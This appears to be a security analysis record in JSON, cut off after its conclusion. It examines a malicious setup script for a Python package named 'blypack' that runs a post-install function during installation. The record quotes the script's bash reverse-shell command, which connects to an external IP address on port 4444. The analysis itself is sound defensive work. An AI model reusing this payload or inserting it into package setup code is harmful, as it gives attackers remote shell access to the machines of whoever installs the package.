{
  "purpose": "The code defines a setup script for a Python package named 'blypack' and attempts to execute a post-installation function.",
  "sources": "The 'post_install' function, which contains a system call to 'os.system' executing a potentially malicious command.",
  "sinks": "The 'os.system' call executing a reverse shell command to IP 81.46.246.181 on port 4444.",
  "flows": "The setup script calls 'post_install' immediately after defining it, which then executes the system command to establish a reverse shell.",
  "anomalies": "The 'post_install' function executes a reverse shell payload unconditionally after the script runs. There are comments suggesting a misunderstanding about proper post-install hooks, but ultimately the code executes the malicious command.",
  "analysis": "The script imports 'os' and 'setuptools', defines a 'post_install' function that runs a bash command creating a reverse shell to an external IP address, then calls 'post_install' immediately after setup. The command 'bash -i >& /dev/tcp/81.46.246.181/4444 0>&1' is a well-known reverse shell payload. The comments indicate confusion about proper setuptools hooks, but the malicious code executes directly at runtime. This indicates an intentional backdoor embedded in the setup process, which is highly suspicious.",
  "conclusion": "The code contains a malicious reverse shell payload executed during installation, indicating intentional sabotage. It likely aims to establish unauthorized remote access to the system where the package is installed.",
